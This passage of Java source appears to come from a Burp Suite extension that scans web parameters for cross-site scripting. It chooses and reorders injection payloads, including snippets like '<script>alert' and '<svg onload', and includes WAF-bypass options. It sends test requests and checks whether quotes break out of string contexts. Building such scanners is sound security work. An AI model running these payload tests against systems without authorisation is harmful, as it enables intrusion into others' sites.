                if (quoteChar == '\'') {
                    // Single-quoted string: \" is literal, not escaped
                    // So if payload is \", it CAN break out if it matches the string delimiter
                    // But \" doesn't match ' (single quote), so it can't break out
                    // However, if the payload is \';, it CAN break out
                    if (payload.charAt(firstQuoteIndex) == '\'') {
                        // Payload contains single quote - can break out of single-quoted string
                        // Check if it's escaped
                        if (backslashCountInPayload % 2 == 1) {
                            // Single quote is escaped - cannot break out
                            callbacks.printOutput("[XSSDetector] FALSE POSITIVE: Single quote in payload is escaped");
                            return false;
                        }
                        // Single quote not escaped - can break out
                        return true;
                    } else if (payload.charAt(firstQuoteIndex) == '"') {
                        // Payload contains double quote, but we're in single-quoted string
                        // \" in single-quoted string is literal, can't break out
                        callbacks.printOutput("[XSSDetector] FALSE POSITIVE: Double quote in single-quoted string cannot break out");
                        return false;
                    }
                } else if (quoteChar == '"') {
                    // Double-quoted string: \" is escaped quote
                    // So if payload is \", the quote is escaped and CANNOT break out
                    if (payload.charAt(firstQuoteIndex) == '"') {
                        // Check if backslash before quote escapes it
                        if (backslashCountInPayload % 2 == 1) {
                            // Quote is escaped - cannot break out
                            callbacks.printOutput("[XSSDetector] FALSE POSITIVE: Double quote in double-quoted string is escaped");
                            return false;
                        }
                        // Quote not escaped - can break out
                        return true;
                    } else if (payload.charAt(firstQuoteIndex) == '\'') {
                        // Single quote in double-quoted string - can break out
                        return true;
                    }
                }
            }
        }
        
        // Check if the string is closed after the payload (look for closing quote)
        String afterPayload = stringContent.substring(payloadInStringIndex + payload.length());
        int closingQuoteIndex = -1;
        for (int i = 0; i < afterPayload.length(); i++) {
            char c = afterPayload.charAt(i);
            if (c == quoteChar) {
                // Check if this quote is escaped
                int backslashCount = 0;
                for (int j = i - 1; j >= 0 && afterPayload.charAt(j) == '\\'; j--) {
                    backslashCount++;
                }
                // If even number of backslashes, this is the closing quote
                if (backslashCount % 2 == 0) {
                    closingQuoteIndex = i;
                    break;
                }
            }
        }
        
        // If we can't find a closing quote, the string might be malformed or the payload breaks it
        if (closingQuoteIndex < 0) {
            // Check if payload contains a quote that would close the string
            if (payload.contains("\"") || payload.contains("'")) {
                // Payload contains quote - check if it's escaped
                // If not escaped, it can break out
                return true; // Assume exploitable if we can't determine
            }
            return false;
        }
        
        // Check what comes after the closing quote - if it's executable code, it's exploitable
        String afterString = afterPayload.substring(closingQuoteIndex + 1).trim();
        if (afterString.startsWith(";") || afterString.startsWith("\n") || 
            afterString.matches("^\\s*[;\\n\\r].*") ||
            afterString.contains("alert") || afterString.contains("eval") ||
            afterString.contains("Function") || afterString.contains("setTimeout")) {
            // Executable code after string - exploitable if quote can break out
            // We already checked if quote is escaped above
            return true;
        }
        
        // If payload is just reflected in a string and nothing executes after, it's not exploitable
        // UNLESS the quote in the payload can break out (which we checked above)
        return false;
    }
    
    /**
     * MAIN SCANNING METHOD - Enhanced aggressive testing
     */
    public List<Map> scanReflectedParameters() {
        startTime = System.currentTimeMillis();
        List<Map> allResults = new ArrayList<>();
        createdIssues.clear(); // Clear previous issues to prevent duplicates
        createdIssueKeys.clear(); // Clear previous issue keys to prevent duplicates
        
        callbacks.printOutput("=== ENHANCED AGGRESSIVE SCANNING STARTED ===");
        callbacks.printOutput("Scanning " + reflectedParameters.size() + " reflected parameters");
        callbacks.printOutput("PayloadManager status: " + (payloadManager != null ? "INITIALIZED" : "NULL"));
        callbacks.printOutput("Settings status: " + (settings != null ? "LOADED" : "NULL"));
        
        if (reflectedParameters.isEmpty()) {
            callbacks.printOutput("WARNING: No reflected parameters to scan");
            return allResults;
        }
        
        int paramIndex = 0;
        for (Map parameter : reflectedParameters) {
            paramIndex++;
            try {
                callbacks.printOutput("--- Processing parameter " + paramIndex + "/" + reflectedParameters.size() + " ---");
                
                if (parameter == null) {
                    callbacks.printError("Parameter " + paramIndex + " is null - skipping");
                    continue;
                }
                
                callbacks.printOutput("Parameter details: " + 
                    "NAME=" + parameter.get(NAME) + 
                    ", TYPE=" + parameter.get(TYPE) + 
                    ", VALUE=" + parameter.get(VALUE));
                
                // CRITICAL: Use the newer, more robust testing method
                // This method uses context-aware payloads and encoding
                List<Map> paramResults = testParameterWithAdvancedTechniques(parameter);
                
                // CRITICAL: Extract issues from paramResults and ensure they're in allResults
                // FINAL VALIDATION: Filter out any issues with confidence <= 0.0
                if (paramResults != null && !paramResults.isEmpty()) {
                    for (Map result : paramResults) {
                        if (result != null) {
                            // FINAL VALIDATION: Check confidence score before adding
                            Object vulnDataObj = result.get("VULNERABILITY_DATA");
                            if (vulnDataObj instanceof Map) {
                                Map<String, Object> vulnData = (Map<String, Object>) vulnDataObj;
                                Object confidenceObj = vulnData.get("CONFIDENCE_SCORE");
                                if (confidenceObj instanceof Number) {
                                    double confidence = ((Number) confidenceObj).doubleValue();
                                    if (confidence <= 0.0) {
                                        callbacks.printOutput("[XSSDetector] FINAL FILTER: Skipping issue with confidence 0 (false positive)");
                                        continue; // Skip false positives
                                    }
                                }
                            }
                            
                            Object issueObj = result.get("ISSUE");
                            Object issueCreated = result.get("ISSUE_CREATED");
                            
                            // If result contains an issue, ensure it's properly tracked
                            if (issueObj instanceof IScanIssue && Boolean.TRUE.equals(issueCreated)) {
                                // Issue is already in createdIssues from testPayloadAdvanced
                                // But ensure it's in allResults
                                allResults.add(result);
                            } else {
                                // Add result even if no issue (might have vulnerability data)
                                allResults.add(result);
                            }
                        }
                    }
                }
                
                callbacks.printOutput("Parameter " + paramIndex + " completed. Results: " + paramResults.size());
                
            } catch (Exception e) {
                logError("Parameter Processing", e);
            }
        }
        
        long duration = System.currentTimeMillis() - startTime;
        callbacks.printOutput("[XSSDetector] Scan completed: " + vulnerabilitiesFound + " vulnerabilities found in " + totalTests + " tests");
        
        // CRITICAL: Extract issues from results and add to allResults
        // This ensures issues are properly returned even if they're not in the Map results
        for (IScanIssue issue : createdIssues) {
            Map issueMap = new HashMap();
            issueMap.put("ISSUE", issue);
            issueMap.put("ISSUE_CREATED", true);
            allResults.add(issueMap);
        }
        
        return allResults;
    }
    
    /**
     * Test parameter with advanced XSS techniques
     */
    private List<Map> testParameterWithAdvancedTechniques(Map parameter) {
        List<Map> results = new ArrayList<>();
        
        // Production-ready parameter validation
        if (parameter == null) {
            callbacks.printOutput("WARNING: Parameter is null - skipping advanced testing");
            return results;
        }
        
        Object nameObj = parameter.get(NAME);
        if (nameObj == null) {
            callbacks.printOutput("WARNING: Parameter name is null - assigning default name");
            parameter.put(NAME, "unnamed_param_" + System.currentTimeMillis());
            nameObj = parameter.get(NAME);
        }
        
        String paramName = nameObj.toString();
        if (paramName.trim().isEmpty()) {
            callbacks.printOutput("WARNING: Parameter name is empty - assigning default name");
            paramName = "empty_param_" + System.currentTimeMillis();
            parameter.put(NAME, paramName);
        }
        
        // Production-ready analytics filtering
        Object valueObj = parameter.get(VALUE);
        String paramValue = valueObj != null ? valueObj.toString() : "";
        
        if (isAnalyticsEndpoint(paramValue)) {
            callbacks.printOutput("SKIPPED: Analytics/tracking endpoint detected for parameter: " + paramName + " (value contains: " + getAnalyticsType(paramValue) + ")");
            return results;
        }
        
        // Production-ready domain filtering
        if (isAnalyticsDomain(baseRequestResponse)) {
            callbacks.printOutput("SKIPPED: Request is to analytics domain - not testing parameter: " + paramName);
            return results;
        }
        
        callbacks.printOutput("Testing parameter: " + paramName + " with advanced techniques");
        
        try {
            // STREAMLINED: Get context-aware payloads with application-type and content-specific intelligence
            // First, enhance parameter with architecture analysis
            ModernArchitectureDetector.ArchitectureAnalysis archAnalysis = null;
            try {
                ModernArchitectureDetector archDetector = new ModernArchitectureDetector(helpers, callbacks, settings);
                archAnalysis = archDetector.analyzeArchitecture(baseRequestResponse);
                if (archAnalysis != null) {
                    parameter.put("ARCH_ANALYSIS", archAnalysis);
                }
            } catch (Exception e) {
                callbacks.printError("Error in architecture analysis: " + e.getMessage());
            }
            
            // Get content type
            String contentType = null;
            try {
                byte[] response = baseRequestResponse.getResponse();
                if (response != null && response.length > 0) {
                    IResponseInfo responseInfo = helpers.analyzeResponse(response);
                    List<String> headers = responseInfo.getHeaders();
                    for (String header : headers) {
                        if (header.toLowerCase().startsWith("content-type:")) {
                            contentType = header.substring(13).trim().split(";")[0].trim();
                            break;
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore
            }
            if (contentType != null) {
                parameter.put("CONTENT_TYPE", contentType);
            }
            
            // Get reflection context if available
            String reflectionContext = (String) parameter.get("REFLECTION_CONTEXT");
            if (reflectionContext != null) {
                parameter.put("REFLECTION_CONTEXT", reflectionContext);
            }
            
            // CRITICAL: Get context-aware payloads with full intelligence AND ensure advanced payloads are included
            // Use the version with helpers parameter to enable encoding variant generation
            List<String> payloads = payloadManager.getContextAwarePayloads(parameter, baseRequestResponse, helpers);
            
            // ENSURE ADVANCED TECHNIQUES: Also explicitly get advanced payloads to ensure nothing is missed
            // This ensures all advanced techniques (Trusted Types, Sanitizer API, DOMPurify, Blob/File API, etc.) are included
            // CRITICAL: For testParameterWithAdvancedTechniques, we want to ensure advanced techniques are ALWAYS included
            try {
                // Temporarily enable advanced settings if they're not already enabled
                // This ensures advanced techniques are tested even if user hasn't enabled all settings
                boolean originalModernBrowserAPI = settings.getEnableModernBrowserAPI();
                boolean originalFrameworkSpecific = settings.getEnableFrameworkSpecific();
                boolean originalPolyglot = settings.getEnablePolyglotPayloads();
                
                // Enable advanced settings for this test (if not already enabled)
                if (!originalModernBrowserAPI) {
                    try {
                        java.lang.reflect.Method setMethod = settings.getClass().getMethod("setEnableModernBrowserAPI", boolean.class);
                        setMethod.invoke(settings, true);
                        callbacks.printOutput("[Advanced Techniques] Temporarily enabled Modern Browser API for advanced testing");
                    } catch (Exception e) {
                        // If reflection fails, continue without it
                    }
                }
                if (!originalFrameworkSpecific) {
                    try {
                        java.lang.reflect.Method setMethod = settings.getClass().getMethod("setEnableFrameworkSpecific", boolean.class);
                        setMethod.invoke(settings, true);
                        callbacks.printOutput("[Advanced Techniques] Temporarily enabled Framework Specific for advanced testing");
                    } catch (Exception e) {
                        // If reflection fails, continue without it
                    }
                }
                
                // Get advanced payloads with settings enabled
                List<String> advancedPayloads = payloadManager.getAdvancedPayloads(parameter);
                
                // Restore original settings
                if (!originalModernBrowserAPI) {
                    try {
                        java.lang.reflect.Method setMethod = settings.getClass().getMethod("setEnableModernBrowserAPI", boolean.class);
                        setMethod.invoke(settings, false);
                    } catch (Exception e) {
                        // Ignore
                    }
                }
                if (!originalFrameworkSpecific) {
                    try {
                        java.lang.reflect.Method setMethod = settings.getClass().getMethod("setEnableFrameworkSpecific", boolean.class);
                        setMethod.invoke(settings, false);
                    } catch (Exception e) {
                        // Ignore
                    }
                }
                
                if (advancedPayloads != null && !advancedPayloads.isEmpty()) {
                    // Merge advanced payloads with context-aware payloads (avoid duplicates)
                    Set<String> payloadSet = new LinkedHashSet<>(payloads);
                    payloadSet.addAll(advancedPayloads);
                    payloads = new ArrayList<>(payloadSet);
                    callbacks.printOutput("[Advanced Techniques] Included " + advancedPayloads.size() + " advanced payloads for parameter: " + paramName);
                }
            } catch (Exception e) {
                callbacks.printError("Error getting advanced payloads: " + e.getMessage());
                // Fallback: just get advanced payloads without modifying settings
                try {
                    List<String> advancedPayloads = payloadManager.getAdvancedPayloads(parameter);
                    if (advancedPayloads != null && !advancedPayloads.isEmpty()) {
                        Set<String> payloadSet = new LinkedHashSet<>(payloads);
                        payloadSet.addAll(advancedPayloads);
                        payloads = new ArrayList<>(payloadSet);
                    }
                } catch (Exception e2) {
                    // Ignore fallback errors
                }
            }
            
            if (payloads == null || payloads.isEmpty()) {
                callbacks.printOutput("No payloads available for parameter: " + paramName);
                return results;
            }
            
            callbacks.printOutput("[Advanced Techniques] Total payloads for parameter " + paramName + ": " + payloads.size());
            
            // CRITICAL: Check if we should try simple payloads first (for error responses)
            boolean shouldTrySimpleFirst = Boolean.TRUE.equals(parameter.get("SHOULD_TRY_SIMPLE_PAYLOADS")) ||
                                         Boolean.TRUE.equals(parameter.get("ORIGINAL_VALUE_REFLECTED_IN_ERROR")) ||
                                         Boolean.TRUE.equals(parameter.get("PARAM_NAME_REFLECTED_IN_ERROR"));
            
            if (shouldTrySimpleFirst) {
                // Reorder payloads to try simple ones first
                List<String> simplePayloads = new ArrayList<>();
                List<String> complexPayloads = new ArrayList<>();
                
                String[] simplePatterns = {"<script>alert", "<img src=x", "<svg onload", "><script>alert", "'><script>"};
                
                for (String payload : payloads) {
                    boolean isSimple = false;
                    for (String pattern : simplePatterns) {
                        if (payload.contains(pattern) && payload.length() < 100) {
                            isSimple = true;
                            break;
                        }
                    }
                    if (isSimple) {
                        simplePayloads.add(payload);
                    } else {
                        complexPayloads.add(payload);
                    }
                }
                
                // Reorder: simple first, then complex
                payloads = new ArrayList<>();
                payloads.addAll(simplePayloads);
                payloads.addAll(complexPayloads);
                callbacks.printOutput("Reordered payloads: " + simplePayloads.size() + " simple, " + complexPayloads.size() + " complex");
            }
            
            // CRITICAL: Increase payload cap when advanced features are enabled to ensure all advanced payloads are tested
            int maxPayloadsToTest = 60;
            try {
                if (settings != null) {
                    boolean aggressiveMode = Boolean.TRUE.equals(settings.getAggressiveMode());
                    String scannerMode = settings.getScannerMode();
                    boolean expertMode = scannerMode != null && scannerMode.contains("Expert");
                    boolean hasAdvancedFeatures = Boolean.TRUE.equals(settings.getEnablePolyglotPayloads()) ||
                                                 Boolean.TRUE.equals(settings.getEnableFrameworkSpecific()) ||
                                                 Boolean.TRUE.equals(settings.getEnablePrototypePollution()) ||
                                                 Boolean.TRUE.equals(settings.getEnablePostMessageXSS()) ||
                                                 Boolean.TRUE.equals(settings.getEnableWebComponents()) ||
                                                 Boolean.TRUE.equals(settings.getEnableModernBrowserAPI()) ||
                                                 Boolean.TRUE.equals(settings.getEnableWAFBypass()) ||
                                                 Boolean.TRUE.equals(settings.getEnableBrowserSpecific());
                    
                    if (aggressiveMode || expertMode) {
                        maxPayloadsToTest = 150; // Test ALL advanced payloads in aggressive/expert mode
                    } else if (hasAdvancedFeatures) {
                        maxPayloadsToTest = 100; // Test more payloads when advanced features enabled
                    } else {
                        maxPayloadsToTest = 35; // Default cap when no advanced features
                    }
                }
            } catch (Exception ignored) {}

            callbacks.printOutput("Testing up to " + maxPayloadsToTest + " payloads (of " + payloads.size() + ") for parameter: " + paramName);
            
            // Production-ready early termination
            boolean vulnerabilityConfirmed = false;
            
            int testedCount = 0;
            for (String payload : payloads) {
                try {
                    if (testedCount++ >= maxPayloadsToTest) {
                        callbacks.printOutput("Reached max payload cap (" + maxPayloadsToTest + ") for parameter: " + paramName + " - stopping further tests for this parameter");
                        break;
                    }
                    // Skip null or empty payloads
                    if (payload == null || payload.trim().isEmpty()) {
                        callbacks.printOutput("Skipping null/empty payload for parameter: " + paramName);
                        continue;
                    }
                    
                    // Test with advanced payload
                    Map result = testPayloadAdvanced(parameter, payload);
                    if (result != null) {
                        // CRITICAL: Check if result contains an ISSUE (from new code) or VULNERABILITY_DATA
                        Object issueObj = result.get("ISSUE");
                        Object vulnDataObj = result.get("VULNERABILITY_DATA");
                        Object issueCreated = result.get("ISSUE_CREATED");
                        
                        if (issueObj instanceof IScanIssue && Boolean.TRUE.equals(issueCreated)) {
                            // CRITICAL: Issue was created - ensure it's added to results
                            // The issue is already tracked in createdIssues, but we need to return it
                            callbacks.printOutput("SUCCESS: Issue created and will be reported for parameter: " + paramName);
                            
                            // Extract vulnerability data for tracking
                            if (vulnDataObj instanceof Map) {
                                results.add((Map) vulnDataObj);
                            } else {
                        results.add(result);
                            }
                            
                        vulnerabilitiesFound++;
                        vulnerabilityConfirmed = true;
                        callbacks.printOutput("[XSSDetector] XSS confirmed: parameter '" + paramName + 
                                            "' with payload '" + payload.substring(0, Math.min(40, payload.length())) + 
                                            (payload.length() > 40 ? "..." : "") + "'");
                        break; // Exit loop after first successful payload
                        } else if (vulnDataObj instanceof Map) {
                            // Vulnerability data available but issue not created (validation failed)
                            callbacks.printOutput("WARNING: Vulnerability detected but issue creation failed (validation) for parameter: " + paramName);
                            results.add((Map) vulnDataObj);
                        } else {
                            // Old code path - result is a Map with vulnerability data
                            // This should not happen with new code, but handle for compatibility
                            results.add(result);
                        }
                    }
                    totalTests++;
                    
                } catch (Exception e) {
                    callbacks.printOutput("WARNING: Payload testing error for " + paramName + " with payload '" + 
                                       (payload != null ? payload.substring(0, Math.min(20, payload.length())) : "null") + 
                                       "': " + e.getMessage());
                    // Continue testing other payloads even if one fails
                }
            }
            
            if (!vulnerabilityConfirmed) {
                callbacks.printOutput("No vulnerabilities confirmed for parameter: " + paramName);
            }
            
        } catch (Exception e) {
            callbacks.printOutput("WARNING: Advanced testing error for parameter " + paramName + ": " + e.getMessage());
            // Use standardized logging instead of printStackTrace
            if (!e.getMessage().contains("datadoghq.com") && !e.getMessage().contains("analytics")) {
                logError("Advanced Testing", e);
            }
        }
        
        // Completed testing for parameter
        return results;
    }
    
    /**
     * CRITICAL FIX: Check if parameter value contains analytics endpoints
     */
    private boolean isAnalyticsEndpoint(String value) {
        if (value == null || value.trim().isEmpty()) {
            return false;
        }
        
        String lowerValue = value.toLowerCase();
        
        // Known analytics and tracking domains/patterns
        String[] analyticsPatterns = {
            "datadoghq.com",           // Datadog
            "browser-intake",          // Datadog browser intake
            "google-analytics.com",    // Google Analytics
            "googletagmanager.com",    // Google Tag Manager
            "doubleclick.net",         // Google DoubleClick
            "facebook.com/tr",         // Facebook Pixel
            "analytics.js",            // Analytics script
            "gtag.js",                 // Google gtag
            "mixpanel.com",           // Mixpanel
            "segment.com",            // Segment
            "hotjar.com",             // Hotjar
            "newrelic.com",           // New Relic
            "bugsnag.com",            // Bugsnag
            "sentry.io",              // Sentry
            "loggly.com",             // Loggly
            "splunk.com",             // Splunk
            "amplitude.com",          // Amplitude
            "intercom.io",            // Intercom
            "zendesk.com",            // Zendesk
            "salesforce.com",         // Salesforce Analytics
            "adobe.com/analytics",    // Adobe Analytics
            "klaviyo.com",            // Klaviyo
            "mailchimp.com",          // Mailchimp
            "hubspot.com",            // HubSpot
            "marketo.com",            // Marketo
            "/analytics/",            // Generic analytics path
            "/tracking/",             // Generic tracking path
            "/telemetry/",            // Generic telemetry path
            "beacon",                 // Beacon endpoints
            "collect?",               // Collection endpoints
            "track?",                 // Tracking endpoints
            "event?",                 // Event tracking
            "metrics"                 // Metrics endpoints
        };
        
        // External services that should be skipped (consistent with Client.java)
        String[] externalServices = {
            // Analytics & Tracking Services
            "safebrowsing.googleapis.com", "bam.nr-data.net", "browser-intake-datadoghq.com",
            "api.datadoghq.com", "rum-http-intake.logs.datadoghq.com", "jssdkcdns.mparticle.com",
            "consent.trustarc.com",
            
            // Microsoft Services (often restricted)
            "login.live.com", "signup.live.com", "fpt.live.com", "df.cfp.microsoft.com",
            
            // Payment Services  
            "paypal.com", "checkout.stripe.com", "api.stripe.com", "square.com", "venmo.com",
            "applepay.apple.com", "googlepay.com", "amazon-pay.amazon.com",
            
            // Social Media Tracking
            "facebook.com/tr", "connect.facebook.net", "analytics.twitter.com", 
            "www.googletagmanager.com",
            
            // CDN & External Resources
            "ajax.googleapis.com", "fonts.googleapis.com", "cdnjs.cloudflare.com",
            "unpkg.com", "jsdelivr.net"
        };
        
        for (String pattern : analyticsPatterns) {
            if (lowerValue.contains(pattern)) {
                return true;
            }
        }
        
        // Check external services that should be skipped
        for (String service : externalServices) {
            if (lowerValue.contains(service)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * CRITICAL FIX: Check if request is going to an analytics domain
     */
    private boolean isAnalyticsDomain(IHttpRequestResponse requestResponse) {
        try {
            if (requestResponse == null || requestResponse.getHttpService() == null) {
                return false;
            }
            
            String host = requestResponse.getHttpService().getHost();
            if (host == null) {
                return false;
            }
            
            return isAnalyticsEndpoint(host);
            
        } catch (Exception e) {
            callbacks.printOutput("WARNING: Error checking analytics domain: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * CRITICAL FIX: Get analytics type for logging
     */
    private String getAnalyticsType(String value) {
        if (value == null) return "unknown";
        
        String lowerValue = value.toLowerCase();
        
        if (lowerValue.contains("datadoghq.com") || lowerValue.contains("browser-intake")) {
            return "Datadog RUM";
        } else if (lowerValue.contains("google-analytics") || lowerValue.contains("gtag")) {
            return "Google Analytics";
        } else if (lowerValue.contains("facebook.com/tr")) {
            return "Facebook Pixel";
        } else if (lowerValue.contains("mixpanel")) {
            return "Mixpanel";
        } else if (lowerValue.contains("segment")) {
            return "Segment";
        } else if (lowerValue.contains("hotjar")) {
            return "Hotjar";
        } else if (lowerValue.contains("newrelic")) {
            return "New Relic";
        } else if (lowerValue.contains("jssdkcdns.mparticle.com")) {
            return "mParticle Analytics SDK";
        } else if (lowerValue.contains("consent.trustarc.com")) {
            return "TrustArc Consent Management";
        // Microsoft Services
        } else if (lowerValue.contains("login.live.com")) {
            return "Microsoft Live Login";
        } else if (lowerValue.contains("signup.live.com")) {
            return "Microsoft Live Signup";
        } else if (lowerValue.contains("fpt.live.com")) {
            return "Microsoft Fraud Protection";
        } else if (lowerValue.contains("df.cfp.microsoft.com")) {
            return "Microsoft Customer Protection";
        // Payment Services
        } else if (lowerValue.contains("paypal.com")) {
            return "PayPal Payment Service";
        } else if (lowerValue.contains("stripe.com")) {
            return "Stripe Payment Service";
        } else if (lowerValue.contains("square.com")) {
            return "Square Payment Service";
        } else if (lowerValue.contains("venmo.com")) {
            return "Venmo Payment Service";
        } else if (lowerValue.contains("applepay") || lowerValue.contains("googlepay") || lowerValue.contains("amazon-pay")) {
            return "Payment Gateway";
        // Social & Tracking
        } else if (lowerValue.contains("facebook.com/tr") || lowerValue.contains("connect.facebook.net")) {
            return "Facebook Tracking";
        } else if (lowerValue.contains("analytics.twitter.com")) {
            return "Twitter Analytics";
        } else if (lowerValue.contains("www.googletagmanager.com")) {
            return "Google Tag Manager";
        // CDN Services
        } else if (lowerValue.contains("ajax.googleapis.com")) {
            return "Google AJAX Libraries CDN";
        } else if (lowerValue.contains("fonts.googleapis.com")) {
            return "Google Fonts CDN";
        } else if (lowerValue.contains("cdnjs.cloudflare.com")) {
            return "Cloudflare CDN";
        } else if (lowerValue.contains("unpkg.com")) {
            return "NPM CDN";
        } else if (lowerValue.contains("jsdelivr.net")) {
            return "JSDelivr CDN";
        } else if (lowerValue.contains("analytics")) {
            return "Analytics Service";
        } else if (lowerValue.contains("tracking")) {
            return "Tracking Service";
        } else {
            return "External Service";
        }
    }
    
    /**
     * Advanced payload testing with comprehensive analysis
     * Uses context-aware encoding for optimal payload injection
     */
    private Map testPayloadAdvanced(Map parameter, String payload) {
        try {
            // CRITICAL FIX: Validate inputs before processing
            if (parameter == null) {
                callbacks.printError("Parameter map is null");
                return null;
            }
            
            if (payload == null || payload.trim().isEmpty()) {
                callbacks.printError("Payload is null or empty");
                return null;
            }
            
            // Validate parameter has required fields
            if (parameter.get(NAME) == null || parameter.get(TYPE) == null) {
                callbacks.printError("Parameter missing NAME or TYPE field");
                return null;
            }
            
            // CONTEXT-AWARE ENCODING: Get reflection context and encode payload accordingly
            String reflectionContext = (String) parameter.get("REFLECTION_CONTEXT");
            String contentType = (String) parameter.get("CONTENT_TYPE");
            String applicationType = (String) parameter.get("APPLICATION_TYPE");
            if (reflectionContext == null) {
                reflectionContext = "UNKNOWN";
            }
            
            // ADVANCED: Check response cache before scanning
            String paramName = (String) parameter.get(NAME);
            if (responseCache != null && baseRequestResponse != null && paramName != null) {
                ResponseCache.CachedResponse cached = responseCache.checkCache(baseRequestResponse, paramName, payload, helpers);
                if (cached != null) {
                    // Use cached result (verbose only - this fires once per cached payload)
                    if (settings != null && settings.getVerboseLogging()) {
                        callbacks.printOutput("[XSSDetector] Using cached result for parameter: " + paramName);
                    }
                    if (cached.isVulnerable) {
                        // CRITICAL: Verify cached result still has payload reflection
                        // Cached results might be stale, so re-verify reflection
                        // Get current response from baseRequestResponse
                        byte[] currentResponseBytes = baseRequestResponse.getResponse();
                        String responseBodyCached = null;
                        boolean payloadReflectedCached = false;
                        
                        if (currentResponseBytes != null && currentResponseBytes.length > 0) {
                            try {
                                int bodyOffset = helpers.analyzeResponse(currentResponseBytes).getBodyOffset();
                                responseBodyCached = new String(
                                    Arrays.copyOfRange(currentResponseBytes, bodyOffset, currentResponseBytes.length),
                                    StandardCharsets.UTF_8
                                );
                                
                                if (responseBodyCached != null && !responseBodyCached.isEmpty()) {
                                    payloadReflectedCached = responseBodyCached.contains(payload);
                                    
                                    // CRITICAL FIX: Do NOT use partial reflection - this causes false positives
                                    // Partial matches are NOT sufficient proof of vulnerability
                                    // Check for partial reflection - REMOVED (too lenient)
                                    // if (!payloadReflectedCached) {
                                    //     String[] payloadParts = payload.split("[<>\"'()\\[\\]{}]");
                                    //     int foundParts = 0;
                                    //     for (String part : payloadParts) {
                                    //         if (part.length() > 3 && responseBodyCached.contains(part)) {
                                    //             foundParts++;
                                    //         }
                                    //     }
                                    //     if (foundParts >= Math.max(1, payloadParts.length / 2)) {
                                    //         payloadReflectedCached = true; // NO - too lenient
                                    //     }
                                    // }
                                }
                            } catch (Exception e) {
                                // Ignore errors
                            }
                        }
                        
                        // Only use cached result if payload is still reflected OR cached result indicates reflection
                        if (payloadReflectedCached || cached.payloadReflected) {
                            // Create issue from cached data
                            Map<String, Object> vulnerabilityData = new HashMap<>();
                            vulnerabilityData.put("paramName", paramName);
                            vulnerabilityData.put("payload", payload);
                            vulnerabilityData.put("vulnerabilityType", cached.vulnerabilityType);
                            vulnerabilityData.put("REFLECTION_CONTEXT", cached.reflectionContext);
                            vulnerabilityData.put("CONFIRMED_XSS", true);
                            vulnerabilityData.put("SCAN_TYPE", "Advanced (Cached)");
                            return vulnerabilityData;
                        } else {
                            callbacks.printOutput("[XSSDetector] Cached result invalidated - payload no longer reflected for parameter: " + paramName);
                        }
                    }
                    // Record non-reflection for tracking
                    if (reflectionTracker != null) {
                        try {
                            IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
                            String endpointPattern = reqInfo.getUrl().toString().split("\\?")[0];
                            reflectionTracker.recordNonReflection(paramName, endpointPattern);
                        } catch (Exception e) {
                            // Ignore
                        }
                    }
                    return null; // Cached as non-vulnerable
                }
            }
            
            // ADVANCED: Check if parameter should be skipped (never reflects)
            if (reflectionTracker != null && baseRequestResponse != null && paramName != null) {
                try {
                    IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
                    String endpointPattern = reqInfo.getUrl().toString().split("\\?")[0];
                    if (reflectionTracker.shouldSkipParameter(paramName, endpointPattern)) {
                        callbacks.printOutput("[XSSDetector] Skipping parameter (never reflects): " + paramName);
                        return null;
                    }
                } catch (Exception e) {
                    // Continue if check fails
                }
            }
            
            // ADVANCED: Record payload test
            if (payloadTracker != null) {
                payloadTracker.recordTest(payload);
            }
            
            // CRITICAL: Get parameter type to determine proper encoding
            Object typeObj = parameter.get(TYPE);
            int paramType = -1;
            if (typeObj instanceof Byte) {
                paramType = ((Byte) typeObj).intValue();
            } else if (typeObj instanceof Integer) {
                paramType = (Integer) typeObj;
            } else if (typeObj instanceof Number) {
                paramType = ((Number) typeObj).intValue();
            }
            
            // Encode payload based on parameter type, reflection context, content type, AND application type
            String encodedPayload = encodePayloadForContext(payload, reflectionContext, contentType, paramType, applicationType);
            
            // CRITICAL FIX: Create test request with context-aware encoded payload
            String testRequest = createAdvancedTestRequest(parameter, encodedPayload);
            if (testRequest == null) {
                if (settings != null && settings.getVerboseLogging()) {
                    callbacks.printOutput("[XSSDetector] Failed to create test request: " + parameter.get(NAME));
                }
                return null;
            }
            
            // Execute request
            String response = executeTestRequest(testRequest);
            if (response == null || response.isEmpty()) {
                if (settings != null && settings.getVerboseLogging()) {
                    callbacks.printOutput("[XSSDetector] Empty response: " + parameter.get(NAME));
                }
                return null;
            }
            
            // CRITICAL FIX: Check for error responses and analyze them for payload reflection
            // Error responses (400, 500) often reflect user input in error messages
            String responseCode = null;
            boolean isErrorResponse = false;
            try {
                // Extract response code from response string
                if (response != null && response.length() > 0) {
                    // Response format: "HTTP/1.1 400 Bad Request\r\n..."
                    int httpIndex = response.indexOf("HTTP/");
                    if (httpIndex >= 0) {
                        int codeStart = response.indexOf(" ", httpIndex) + 1;
                        int codeEnd = response.indexOf(" ", codeStart);
                        if (codeEnd > codeStart) {
                            responseCode = response.substring(codeStart, codeEnd);
                            isErrorResponse = responseCode.startsWith("4") || responseCode.startsWith("5");
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore
            }
            
            if (isErrorResponse) {
                callbacks.printOutput("INFO: Error response received (" + responseCode + ") - performing comprehensive error analysis");
                
                String errorResponseBody = extractResponseBody(response);
                if (errorResponseBody == null || errorResponseBody.isEmpty()) {
                    errorResponseBody = response; // Fallback to full response
                }
                
                // CRITICAL: Check if original parameter VALUE is reflected in error (even if payload isn't)
                // This indicates the parameter is being processed and reflected, which is a vulnerability sign
                String originalParamValue = (String) parameter.get(VALUE);
                boolean originalValueReflected = false;
                if (originalParamValue != null && !originalParamValue.trim().isEmpty()) {
                    originalValueReflected = errorResponseBody.contains(originalParamValue) ||
                                           errorResponseBody.toLowerCase().contains(originalParamValue.toLowerCase());
                    if (originalValueReflected) {
                        // Parameter value reflected in error response
                        parameter.put("ORIGINAL_VALUE_REFLECTED_IN_ERROR", true);
                    }
                }
                
                // CRITICAL: Check if parameter NAME is reflected in error (indicates parameter processing)
                String paramNameForError = (String) parameter.get(NAME);
                boolean paramNameReflected = false;
                if (paramNameForError != null && !paramNameForError.trim().isEmpty()) {
                    paramNameReflected = errorResponseBody.contains(paramNameForError) ||
                                       errorResponseBody.toLowerCase().contains(paramNameForError.toLowerCase());
                    if (paramNameReflected) {
                        // Parameter name reflected in error response
